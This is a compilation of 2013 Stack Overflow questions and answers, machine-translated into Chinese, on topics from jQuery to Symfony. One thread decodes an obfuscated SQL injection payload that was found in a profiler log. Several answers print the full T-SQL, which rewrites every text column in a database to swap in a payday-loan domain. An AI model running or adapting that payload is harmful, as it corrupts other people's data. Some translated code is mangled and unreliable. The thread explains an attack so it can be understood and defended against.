> 标签：javascript, jquery

说我有代码：

```
$("#auto").append('<div id="' + results_id + '"></div>'); 
```

但我想`auto`成为一个字符串：

```
var string="auto"; 
```

然后我想用它作为：

```
$("\'+string+'\").append('<div id="' + results_id + '"></div>'); 
```

我不知道为什么，但这会引发一些错误。

有人暗示我必须使用转义字符串才能以这种方式使用它，但是不知道为什么，我没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:11:30.923

这就是您要查找的内容：

```
var string = "auto";
$('#' + string).append('<div id="' + results_id + '"></div>'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:11:32.100

jQuery 允许您毫无问题地为选择器使用变量。您只需要记住调用正确的元素，因此如果您调用 ID，请记住在变量值之前使用**# 。**`string`

```
var string="auto";
$("#"+string).append('<div id="' + results_id + '"></div>'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:11:25.477

像这样做：

```
$('#' + string) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:11:44.500

您的 qoutes 没有正确嵌套，并且您错过了尖锐的标志。也许尝试这样的事情：

```
$("#"+string).append('<div id="' + results_id + '"></div>'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:13:17.230

写：

```
var myString = '#' + MYID;
$(myString).append('<div id="' + results_id + '"></div>'); 
```

“一些解释”

希望这可以帮助！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-06T10:21:04.633

基本问题是您混淆了变量名及其值。

`"#auto"`是一个字符串。

如果我声明一个变量，如：

```
var myString = "auto"; 
```

然后注意**变量** `myString`包含值，`"auto"`。

在 jQuery 中，您可以通过调用它来获取要操作的元素（我们下面的示例中的 div）`$("#auto")`- 这意味着我想要在 HTML 页面上声明的页面元素：

```
<div id="auto">...</div> 
```

但是，由于您可以将字符串作为**参数**传递给特殊`$("#")`函数，以便从页面中`#`获取*紧随其后的任何内容。*

因此，您`$("#auto")`可以使用`$("#"+myString)`上面示例中的固定和预先确定的参数来代替像再次。`myString``$("#"+myString)`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-06T10:20:48.950

您实际上不必使用 jQuery 来解析符号本身。你可以`<div />`用更好的方式创建你的：

```
$(document.getElementById(string))
    .append($('<div />', {id: results_id})); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-06T10:26:24.940

```
var string = "auto";
$('#' + string).append(.....); 
```

希望这是您问题的解决方案。

并且可以查看以下链接以了解有关选择器的更多信息。

[https://css-tricks.com/forums/discussion/9766/jquery-selector-div-variable/p1](https://css-tricks.com/forums/discussion/9766/jquery-selector-div-variable/p1)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-03-06T10:11:19.550

写：

```
$('#' + string).append('<div id="' + results_id + '"></div>'); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-03-06T10:14:20.190

```
<script>
 var string = 'auto';
 $("#"+string).append('THE STRING YOU WANT');
</script>

<div id="auto"><div> 
```

我希望这有帮助。

# php - Git POST webhook shell_exec

> ID：15244340
> 
> 赞同：1
> 
> 时间：2013-03-06T10:09:15.687
> 
> 标签：php, linux, git

我有一个在 PHP 中运行以下 shell_exec cmd 的脚本。

```
echo shell_exec('cd /var/www/Library/Laravel/ ; git pull bitbucket master ; 2>&1'); 
```

这是由 webhook 服务调用的，我想要做的只是减少每次推送时都必须拉入这个开发环境。

但是，调用此路由时，我没有收到任何输出错误或任何内容。谁能建议这可能是为什么？

我从error_log中得到了这个回声->

```
error: cannot open .git/FETCH_HEAD: Permission denied 
```

我将 apache 用户添加到 git，现在我收到以下错误

```
Could not create directory '/var/www/.ssh'.
Host key verification failed.
fatal: The remote end hung up unexpectedly 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T18:02:12.600

我在这里看到一些问题：

1) 您的执行行 "...; git pull bitbucket master ; 2>&1" 应该是 "... git pull bitbucket master 2>&1" - 多余的分号可能会阻止您看到标准错误输出。

2）你发现了所有权问题，所以......

3) 我猜你有一个基于“ssh”的 git URL。第一次以用户身份运行 SSH 时，它将尝试验证主机密钥（另一端的 SSH id）。如果工具不是交互式的并且您尚未接受密钥，则 SSH 的默认行为是失败。或者，如果您接受了密钥，您会看到相同的行为，但它已经改变了。你会以不同的方式解决这两个不同的问题。

解决此问题的“正确”方法是手动运行命令（作为具有适当 HOME 变量集的用户）并手动接受密钥，以便后续命令将“正常工作”。

另一种可能性是覆盖 SSH 的默认行为 - 请参阅“StrictHostKeyChecking”SSH 选项的文档。您可以做一些黑客行为以在命令行上传递它或创建一个 ~/.ssh/config 文件来指定选项。（注意：我推荐第一个解决方案，而不是这个解决方案，除非您了解安全隐患。）

最后，我怀疑您还需要设置您的 SSH 私钥以允许您以该用户的身份进行拉取。

# django - 使用 django 表单向导更新数据库

> ID：15244343
> 
> 赞同：0
> 
> 时间：2013-03-06T10:09:24.920
> 
> 标签：django, django-models, django-forms, django-views, django-formwizard

大家好，这里是我的代码

```
class FarticlesWizard(SessionWizardView):

def done(self,form_list,**kwargs):
    form_dict={}
    for x in form_list:
        form_dict=dict(form_dict.items()+x.cleaned_data.items())
    insert_db=Marticles(heading = form_dict['heading'],
    content = form_dict['content'],
    country=form_dict['country'],work=form_dict['work'],created_by=self.request.user)
    insert_db.save()
    return HttpResponseRedirect('/display/') 
```

上面的代码通过将数据插入数据库可以正常工作。现在我想为特定的“id”更新数据库有没有办法解决它？iam id 通过 urls.py

```
url(r'^create/(?P<id>\d+)/$', FarticlesWizard.as_view([F1articles, F2articles])), 
```

上面的网址看起来像这样

```
http://MyIp/create/12/ 
```

如您所见，id=12，现在如何更新特定 ID 的数据库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T12:31:45.957

使用`obj = Obj.objects.get(pk = some_`id`)`获取 id 并用于显示使用渲染

# magento - Magento -> addAttributeToFilter - 从集合中删除选定的产品

> ID：15244349
> 
> 赞同：0
> 
> 时间：2013-03-06T10:09:38.950
> 
> 标签：magento

我希望在我的产品页面上制作一个简单的相关产品块，我们有大量产品，所以目前使用加售等后端条目并不可行。

下面我有一些代码通过使用“prod_colour”来选择类似的产品——所以如果一个人正在查看米色的产品，它会返回该类别中的所有米色产品，然后随机选择 4 来显示。

```
<?php

$thiscolour = $_helper->productAttribute($_product, $_product->getProd_colour(), 'prod_colour');
$bestsellers=Mage::getModel('catalog/category')->load(3);
$collection=$bestsellers->getProductCollection();
$collection->addAttributeToFilter('prod_colour', $thiscolour);
$collection->addAttributeToSelect('small_image');
$collection->getSelect()->order(new Zend_Db_Expr('RAND()'));
$collection->getSelect()->limit(4);

?> 
```

我只是想知道如何从集合中删除当前查看的产品 - 例如，如果我正在查看产品 1，并且产品 1、3、5、7 都是相同的颜色，它会返回所有四种产品 - 我'会希望删除产品 1，因此该块将仅显示产品 3、5 和 7。

谢谢阅读！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:18:09.100

您在产品页面上，因此您可以获取产品 ID，以便您可以在产品集合中使用以下过滤条件

```
addAttributeToFilter('id', array('neq' => 'yourid')); 
```

如需了解更多情况，您可以[在此处查看](http://fishpig.co.uk/blog/addattributetofilter-conditionals-in-magento.html)

# node.js - 在 Windows 命令行上使用 nodejs exec 返回机器 IP 地址

> ID：15244356
> 
> 赞同：0
> 
> 时间：2013-03-06T10:09:52.007
> 
> 标签：node.js, exec, command-line-interface, ping

我正在尝试使用 child.exec 将 Windows 机器的 IP 地址返回到节点进程中。简单的命令行似乎工作，但任何模糊复杂的失败 - 任何人都得到任何建议的解决方案/解释为什么它会失败？

代码如下：

```
var exec = require('child_process').exec;
var ifconfig = (process.platform !== undefined && process.platform !== 'win32') ? 'ifconfig eth0' : 'ping -4 %COMPUTERNAME%';

var child = exec(ifconfig, function(err, stdout, stderr) {
    if (err) throw err;
    else console.log('child', stdout);
}); 
```

var FYI 'ping %COMPUTERNAME%' 有效，'ping %COMPUTERNAME% -4' 失败。

另外仅供参考，这里对 CLI 代码的原始建议：

[http://ayesamson.com/2011/06/13/get-ip-address-from-windows-command-line/](http://ayesamson.com/2011/06/13/get-ip-address-from-windows-command-line/)

塔

ñ

# javascript - 动态加载的元素不同于静态元素，尽管它们具有相同的 HTMl

> ID：15244359
> 
> 赞同：1
> 
> 时间：2013-03-06T10:09:55.797
> 
> 标签：javascript, jquery, html, asp.net-mvc-3

我正在使用 ASP.NET MVC 3 并从模型构建我的 html 页面，如下所示：

```
foreach (var item in Model.OfficialHolidaysViewModel.OfficialHolidaysForCurrentYear) 
{
   <li class="date-label"  data-id=@item.OfficialHolidayID data-date=@item.ShortDateString data-type="OfficialHoliday">
      <span class=date-text>@item.ShortDateString</span>
      <img alt="close icon" class="date-close-icon" src="/Content/Images/x_icon.png" />
   </li>
} 
```

这将呈现和 html 元素，例如：

```
 <li class="date-label" data-id="5" data-date="5/28/2013" data-type="OfficialHoliday">
        <span class="date-text">5/28/2013</span>
        <img alt="close icon" class="date-close-icon" src="/Content/Images/x_icon.png">
     </li> 
```

这看起来像：

![在此处输入图像描述](../Images/50aba216ceb1ed86127007d0ba6a8f11.png) 但是，当我用 jquery 插入一个新元素时：

```
$('#OfficialHolidaysCurrentYear').append(
       '<li class="date-label" data-id="' + dateID + '" data-date="' + dateString + '" data-type="' + dataType +'">' +
            '<span class="date-text">' + toRomanianLiteralFormat(dateString) + '</span>' +
            '<img alt="close icon" class="date-close-icon" src="/Content/Images/x_icon.png" />' +
       '</li>') 
```

这得到正确参数化，结果是 html：

```
 <li class="date-label" data-id="542" data-date="03/02/2013" data-type="OfficialHoliday">                                         
           <span class="date-text">02/Mar/2013</span>
          <img alt="close icon" class="date-close-icon" src="/Content/Images/x_icon.png">
        </li> 
```

这在浏览器中看起来像：

![在此处输入图像描述](../Images/63b317cfdf85cb78e1258a5e309a2f10.png) 我不明白为什么它们看起来不同（注意第一张图片中日期文本和 x 图标之间的差距），根据我的样式表，第二个是正确的....但是为什么第一个看起来不一样他们有相同的html和css？？？

顺便说一句，这是我的样式表（.date-text 没有应用样式）：

```
.date-label
{
    -moz-border-radius: 3px;
    border-radius: 3px;
    border: 1px solid #aaa;
    border-color: rgba(0, 0, 0, 0.3);
    background: #fff;
    color: rgba(0, 0, 0, 0.8);
    font-size: 16px;
    font-weight: normal;
    display: inline-block;
    line-height: 1.3;
    padding: 1px 0px 1px 0px;
    vertical-align: middle;
    overflow: hidden;
    text-overflow: ellipsis;
    max-width: 100%; 
    margin:0px 5px 0px 0px;
    box-shadow: 1px 1px 1px #555555;
    -moz-box-shadow: 1px 1px 1px #555555;
}

.date-close-icon
{
    height:11px;
    width:11px;
    cursor:pointer;
} 
```

### 更新 ：

这是 HTML 回车的问题，有关详细信息，请参阅 Aleksandr M 的答案中的链接！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:12:43.127

如果你想要它没有间隙，只需编写没有回车的代码，`li`就像这样

```
foreach (var item in Model.OfficialHolidaysViewModel.OfficialHolidaysForCurrentYear) 
{
   <li class="date-label"  data-id=@item.OfficialHolidayID data-date=@item.ShortDateString data-type="OfficialHoliday">
      <span class=date-text>@item.ShortDateString</span><img alt="close icon" class="date-close-icon" src="/Content/Images/x_icon.png" />
   </li>
} 
```

请参阅此链接： http: [//www.netmechanic.com/news/vol1/html_no3.htm](http://www.netmechanic.com/news/vol1/html_no3.htm)

> 从理论上讲，HTML 不会关注源文档中的空白。实际上，您的浏览器会将回车解释为单个空格字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:18:20.690

您的问题似乎是由换行符（在呈现的 html 文档中插入空格）引起的。如果您不需要这两个元素的空间，那么您可以将这两个元素浮动到左侧，它将忽略该空间。

# symfony - URL 在生产中给出内部服务器错误，但在开发中有效？

> ID：15244380
> 
> 赞同：4
> 
> 时间：2013-03-06T10:10:53.973
> 
> 标签：symfony, doctrine-orm, symfony-2.2

我对 symfony2 和教义 2 比较陌生，并且对某些事情感到困惑......

在`dev`环境中访问某个页面时，我按预期获得了该页面的内容，但是当我尝试使用该环境打开完全相同的页面`prod`时，我看到的只是“内部服务器错误”。

顺便说一句，其他页面`prod`工作正常......

查看 php 错误日志，我看到了

> PHP 警告：需要（[路径]/app/cache/prod/doctrine/orm/Proxies/_ *CG* _SitesMyBundleEntity[myEntity].php）：无法打开流：[路径]\vendor\doctrine\ 中没有这样的文件或目录orm\lib\Doctrine\ORM\Proxy\ProxyFactory.php 在第 92 行

查看相关目录，确实没有提到的代理文件，但其他的。

我尝试完全清除缓存目录无济于事，同样适用于重新生成实体。

也许相关：我最近升级了 tot symfony 2.2 及其配套的学说版本。

谁能指出我为什么没有自动创建特定代理（当其他人是）以及我可以做些什么来解决这个问题？

[编辑]
即使运行时抛出的反射错误`php app/console cache:warmup --env=prod`与代理文件丢失的实体无关，解决反射错误也解决了“内部服务器错误”

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-03-24T23:06:42.983

`auto_generate_proxy_classes: %kernel.debug%`在 config.yml 中取消注释。

# php - 使用 php 创建 10 行 10 列的电子表格

> ID：15244384
> 
> 赞同：1
> 
> 时间：2013-03-06T10:10:56.387
> 
> 标签：php, zend-gdata

我成功创建了一个包含大量行和列的电子表格，但我只想要 10 行和 10 列

```
require_once('Zend/Loader.php');
Zend_Loader::loadClass('Zend_Gdata');
Zend_Loader::loadClass('Zend_Gdata_ClientLogin');
Zend_Loader::loadClass('Zend_Gdata_Docs');

// Authentication
$client = Zend_Gdata_ClientLogin::getHttpClient('you@there.com', 'sunshine-',        Zend_Gdata_Docs::AUTH_SERVICE_NAME);

// Get interface to Documents List API
$docs = new Zend_Gdata_Docs($client);

// Create new document
$data = new Zend_Gdata_Docs_DocumentListEntry();
$data->setCategory(
  array(new Zend_Gdata_App_Extension_Category(
          "http://schemas.google.com/docs/2007#spreadsheet",
          "http://schemas.google.com/g/2005#kind"
)));
$data->setTitle(new Zend_Gdata_App_Extension_Title("My brand new spreadsheet", null));

// Add document to your list
$doc = $docs->insertDocument($data, Zend_Gdata_Docs::DOCUMENTS_LIST_FEED_URI);

// Display document ID
print($doc->getId()); 
```

# java-7 - SimpleDateFormat 使用 JDK7 返回 NULL 日期，但使用 JDK6 可以正常工作

> ID：15244385
> 
> 赞同：0
> 
> 时间：2013-03-06T10:10:56.907
> 
> 标签：java-7

我有这个示例 java 代码，我试图根据 SimpleDateFormat 上设置的模式将 String 解析为 Date 。当我在 JDK6 中运行此代码时，它工作正常。但在 JDK7 中，解析调用返回 NULL。知道 JDK7 发生了什么变化。这是一个已知问题还是任何解决方法？

```
 SimpleDateFormat _theSimpleDateFormatHelper =  new SimpleDateFormat();
  _theSimpleDateFormatHelper.setLenient(false);
  _theSimpleDateFormatHelper.applyPattern("yyyy-MM-dd hh:mm:ss");

  ParsePosition parsePos = new ParsePosition(0);
  Object formattedObj = _theSimpleDateFormatHelper.parse("1989-09-21 00:00:00", parsePos); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T19:51:05.300

以下代码工作正常：

```
SimpleDateFormat _theSimpleDateFormatHelper =  new SimpleDateFormat();
//_theSimpleDateFormatHelper.setLenient(false); <-- In lenient mode, the parsing succeeds
_theSimpleDateFormatHelper.applyPattern("yyyy-MM-dd hh:mm:ss");

ParsePosition parsePos = new ParsePosition(0);
Object formattedObj = _theSimpleDateFormatHelper.parse("1989-09-21 00:00:00", parsePos); 
```

它不起作用的原因是因为格式在严格模式下不正确。从这个页面[http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)，您可以看到`h`范围是 1-12。

如果您`H`改用，范围是 0-23，这也可以：

```
SimpleDateFormat _theSimpleDateFormatHelper =  new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
_theSimpleDateFormatHelper.setLenient(false);
Object formattedObj = _theSimpleDateFormatHelper.parse("1989-09-21 00:00:00"); 
```

# sql - 它有什么作用。？

> ID：15244386
> 
> 赞同：2
> 
> 时间：2013-03-06T10:10:59.317
> 
> 标签：sql, sql-injection

我最近在 SQL Profiler 的帮助下在我的应用程序中发现了 SQL 注入的原因：

原因是这样的：

> SELECT * FROM tbl_posting_job_info where job_posting_id=33131 declare @s varchar(8000) set@s=演员（20424547494e20455845432827555044415445205b272b40542b275d20534554205b272b40432b275d3d5245504c414345285b272b40432b275d2c2027276164616d7061796461796c6f616e732e636f6d27272c202727647265777061796461796c6f616e732e636f6d272729207768657265205b272b40432b275d206c696b65202727256164616d7061796461796c6f616e732e636f6d252727202729204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c404320454e4420434c4f5345205461626c655f437572736f72204445414c4c4f43415445205461626c655f437572736f72为varchar（8000））的exec（@s）执行（@s）执行（@s）

它作为查询字符串传递。

所以谁能告诉我它说什么..？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:13:07.683

`Exec`可以执行作为字符串传递的 SQL 代码。因此，他们将字符串混淆为字符的十六进制代码，以降低您的可读性。如果将其从十六进制转换为文本，则会给出：

```
set ansi_warnings off DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') and c.CHARACTER_MAXIMUM_LENGTH>10 and t.table_name=c.table_name and t.table_type='BASE TABLE' OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+'], ''adampaydayloans.com'', ''drewpaydayloans.com'') where ['+@C+'] like ''%adampaydayloans.com%'' ') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor 
```

格式化版本：

```
SET ansi_warnings OFF 

DECLARE @T VARCHAR(255), 
        @C VARCHAR(255) 
DECLARE table_cursor CURSOR FOR 
  SELECT c.table_name, 
         c.column_name 
  FROM   information_schema.columns c, 
         information_schema.tables t 
  WHERE  c.data_type IN ( 'nvarchar', 'varchar', 'ntext', 'text' ) 
         AND c.character_maximum_length > 10 
         AND t.table_name = c.table_name 
         AND t.table_type = 'BASE TABLE' 

OPEN table_cursor 

FETCH next FROM table_cursor INTO @T, @C 

WHILE( @@FETCH_STATUS = 0 ) 
  BEGIN 
      EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+ 
      '], ''adampaydayloans.com'', ''drewpaydayloans.com'') where ['+@C+ 
      '] like ''%adampaydayloans.com%'' ') 

      FETCH next FROM table_cursor INTO @T, @C 
  END 

CLOSE table_cursor 

DEALLOCATE table_cursor 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:16:27.847

该字符串是十六进制编码的版本

> 设置 ansi_warnings 关闭 DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t where c.DATA_TYPE in ('nvarchar',' varchar','ntext','text') and c.CHARACTER_MAXIMUM_LENGTH>10 and t.table_name=c.table_name and t.table_type='BASE TABLE' OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@ FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+'], ''adampaydayloans.com'', ''drewpaydayloans.com'' ) where ['+@C+'] like ''%adampaydayloans.com%'' ') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor

我使用[http://home.paulschou.net/tools/xlate/](http://home.paulschou.net/tools/xlate/)对其进行解码。

[格式很好](http://www.dpriver.com/pp/sqlformat.htm)，SQL代码如下：

```
SET ansi_warnings OFF 

DECLARE @T VARCHAR(255), 
        @C VARCHAR(255) 
DECLARE table_cursor CURSOR FOR 
  SELECT c.table_name, 
         c.column_name 
  FROM   information_schema.columns c, 
         information_schema.tables t 
  WHERE  c.data_type IN ( 'nvarchar', 'varchar', 'ntext', 'text' ) 
         AND c.character_maximum_length > 10 
         AND t.table_name = c.table_name 
         AND t.table_type = 'BASE TABLE' 

OPEN table_cursor 

FETCH next FROM table_cursor INTO @T, @C 

WHILE( @@FETCH_STATUS = 0 ) 
  BEGIN 
      EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+ 
      '], ''adampaydayloans.com'', ''drewpaydayloans.com'') where ['+@C+ 
      '] like ''%adampaydayloans.com%'' ') 

      FETCH next FROM table_cursor INTO @T, @C 
  END 

CLOSE table_cursor 

DEALLOCATE table_cursor 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:16:38.463

```
    选择投掷（24547494e20455845432827555044415445205b272b40542b275d20534554205b272b40432b275d3d5245504c414345285b272b40432b275d2c2027276164616d7061796461796c6f616e732e636f6d27272c202727647265777061796461796c6f616e732e636f6d272729207768657265205b272b40432b275d206c696b65202727256164616d7061796461796c6f616e732e636f6d252727202729204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c404320454e4420434c4f5345205461626c655f437572736f72204445414c4c4f43415445205461626c655f437572736f72为varchar（8000））varchar(8000))varchar(8000))

```

产量：

```
set ansi_warnings off 
DECLARE @T VARCHAR(255),@C VARCHAR(255) 
DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from     
INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t 
where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') and 
c.CHARACTER_MAXIMUM_LENGTH>10 and t.table_name=c.table_name and t.table_type='BASE 
TABLE' 

OPEN Table_Cursor 
FETCH NEXT FROM Table_Cursor INTO @T,@C 
WHILE(@@FETCH_STATUS=0) 
BEGIN 
EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+'], ''adampaydayloans.com'', 
''drewpaydayloans.com'') where ['+@C+'] like ''%adampaydayloans.com%'' ') 
FETCH NEXT FROM Table_Cursor INTO @T,@C 
END 

CLOSE Table_Cursor 
DEALLOCATE Table_Cursor 
```

本质上，它正在检查表中是否存在字符串`adampaydayloans.com`，并将其替换为另一个值`drewpaydayloans.com`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:17:06.570

如果您在数据库中执行以下查询

```
select cast(0x73657420616e73695f7761726e696e6773206f6666204445434c415245204054205641524348415228323535292c404320564152434841522832353529204445434c415245205461626c655f437572736f7220435552534f5220464f522073656c65637420632e5441424c455f4e414d452c632e434f4c554d4e5f4e414d452066726f6d20494e464f524d4154494f4e5f534348454d412e636f6c756d6e7320632c20494e464f524d4154494f4e5f534348454d412e7461626c6573207420776865726520632e444154415f5459504520696e2028276e76617263686172272c2776617263686172272c276e74657874272c2774657874272920616e6420632e4348415241435445525f4d4158494d554d5f4c454e4754483e313020616e6420742e7461626c655f6e616d653d632e7461626c655f6e616d6520616e6420742e7461626c655f747970653d2742415345205441424c4527204f50454e205461626c655f437572736f72204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c4043205748494c4528404046455443485f5354415455533d302920424547494e20455845432827555044415445205b272b40542b275d20534554205b272b40432b275d3d5245504c414345285b272b40432b275d2c2027276164616d7061796461796c6f616e732e636f6d27272c202727647265777061796461796c6f616e732e636f6d272729207768657265205b272b40432b275d206c696b65202727256164616d7061796461796c6f616e732e636f6d252727202729204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c404320454e4420434c4f5345205461626c655f437572736f72204445414c4c4f43415445205461626c655f437572736f72 as varchar(8000)) 
```

你会得到

```
set ansi_warnings off DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') and c.CHARACTER_MAXIMUM_LENGTH>10 and t.table_name=c.table_name and t.table_type='BASE TABLE' OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=REPLACE(['+@C+'], ''adampaydayloans.com'', ''drewpaydayloans.com'') where ['+@C+'] like ''%adampaydayloans.com%'' ') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor 
```

您应该在执行查询之前验证**job_posting_id**是否是一个数字，这样就无法注入他们的代码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:17:56.170

使用这个：

[http://www.dolcevie.com/js/converter.html](http://www.dolcevie.com/js/converter.html)

看起来传入的十六进制变成了这个

```
set ansi_warnings off 
DECLARE @T VARCHAR(255),@C VARCHAR(255) 
DECLARE Table_Cursor CURSOR FOR 
select c.TABLE_NAME,
       c.COLUMN_NAME 
from INFORMATION_SCHEMA.columns c, 
INFORMATION_SCHEMA.tables t 
where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') 
and c.CHARACTER_MAXIMUM_LENGTH>10 and t.table_name=c.table_name 
and t.table_type='BASE TABLE' 

OPEN Table_Cursor 
FETCH NEXT 
FROM Table_Cursor 
INTO @T,@C 

WHILE(@@FETCH_STATUS=0) 
BEGIN 
  EXEC(
    'UPDATE ['+@T+'] 
    SET ['+@C+']=REPLACE(['+@C+'], ''adampaydayloans.com'', ''drewpaydayloans.com'')
    where ['+@C+'] like ''%adampaydayloans.com%'' 
  ') 

  FETCH NEXT FROM Table_Cursor 
  INTO @T,@C 
END 

CLOSE Table_Cursor 
DEALLOCATE Table_Cursor 
```

所以看起来一些阴暗的发薪日贷款类型正在尝试更改数据库中包含指向某些竞争对手的链接的所有 varchar/文本字段，以包含指向其发薪日贷款网站的链接。

# swing - 我在摇摆中使用日历

> ID：15244391
> 
> 赞同：0
> 
> 时间：2013-03-06T10:11:03.683
> 
> 标签：swing

我在摇摆中使用日历，发生错误，当我单击按钮时，如果没有选择日期，日历不会处理。假设用户未选择任何日期时如何实现处置功能。下面的代码： -

```
 JButton btnDate = new JButton("");
            btnDate.setBackground(Color.WHITE);
            btnDate.setBorder(null);
            btnDate.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
            btnDate.setToolTipText(" Click to Select date");
            btnDate.setIcon(new ImageIcon(SendFile.class.getResource("/images/Calender.png")));
            btnDate.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent arg0) {
                    DatePicker dp = new DatePicker((Observer) textField, getLocale());
                    dp.setSelectedDate(new Date());
                    dp.start(textField);
                }
            });
            btnDate.setBounds(396, 230, 24, 24);
            add(btnDate);

and using class :
class ObservingTextField extends JTextField implements Observer {
        public void update(Observable o, Object arg) {
            Calendar calendar = (Calendar) arg;
            DatePicker dp = (DatePicker) o;
            System.out.println("picked=" + dp.formatDate(calendar));
            setText(dp.formatDate(calendar));
        }
    } 
```

# php - MySQL 允许使用的最大连接数 - 编码错误？

> ID：15244395
> 
> 赞同：2
> 
> 时间：2013-03-06T10:11:10.997
> 
> 标签：php, mysql, connection

我最近在我们的网站上遇到了问题。用户/访问者被拒绝连接到数据库。当我尝试通过 PHPMyAdmin 登录并返回此消息时：“#1203 - 用户已经拥有超过 'max_user_connections' 的活动连接。”

它是一个共享主机，显然允许的最大连接数是 20。我无法更改这一点，但该站点通常一次不会超过 20 个，并且错误出现大约一两个小时。

当我问主机问题是什么时，所有发回的都是这样的：“我们担心这与糟糕的脚本有关，并且正在填充您分配到数据库的所有连接（20）。您需要检查脚本以及您尝试归还的数据资产”。

这到底是什么意思？

这是我正在使用的典型代码：

```
session_start();
require 'include.php';
mysql_connect($DBhost,$DBuser,$DBpass);
mysql_select_db("$DBName"); 
```

我知道这里的信息并没有提供太多具体脚本的方式，但我想知道连接没有关闭是否有问题？任何有任何想法的人都会有很大帮助，我可以看看这个。是否有任何可能导致此问题的编码错误？页面加载后连接不应该自动关闭吗？

先感谢您

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T23:20:32.510

要了解当前有多少连接，您可以单击 STATUS，然后单击 PHPMYADMIN 中 Runtime Information 下的 SERVER 选项卡。或运行：

```
mysqladmin -uroot -ppassword processlist (from command line) 
```

告诉您的主机您只想限制来自本地主机的连接。我怀疑你正在从互联网上受到调查。processlist 命令会告诉您是否是这种情况。

# c - _("text")，即下划线括号字符，有什么作用？

> ID：15244397
> 
> 赞同：16
> 
> 时间：2013-03-06T10:11:18.543
> 
> 标签：c

在 C 代码中，我遇到了这一点

```
_("test") 
```

它有什么作用？（我尝试自己查找，但您可以想象，搜索引擎不支持搜索...）

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-06T10:14:23.517

它正在调用名为 的函数`_`。例如：

```
#include <stdio.h>

void _(int a) {
    printf("%d",a);
}
int main(void) {
         _(3);
        return 0;
} 
```

`_`[是gettext 库](http://www.gnu.org/software/gettext/)中的现有函数，用于国际化。正如[这个答案](https://stackoverflow.com/a/3336128/812912)中所说：

> 这个函数基本上在运行时用系统语言的翻译替换给定的字符串，如果可用的话（即，如果他们为程序提供了该语言的 .mo 文件）。

# actionscript-3 - 通过在 ActionScript 3 中保持一端固定来旋转直线

> ID：15244402
> 
> 赞同：0
> 
> 时间：2013-03-06T10:11:30.147
> 
> 标签：actionscript-3, apache-flex, flex3

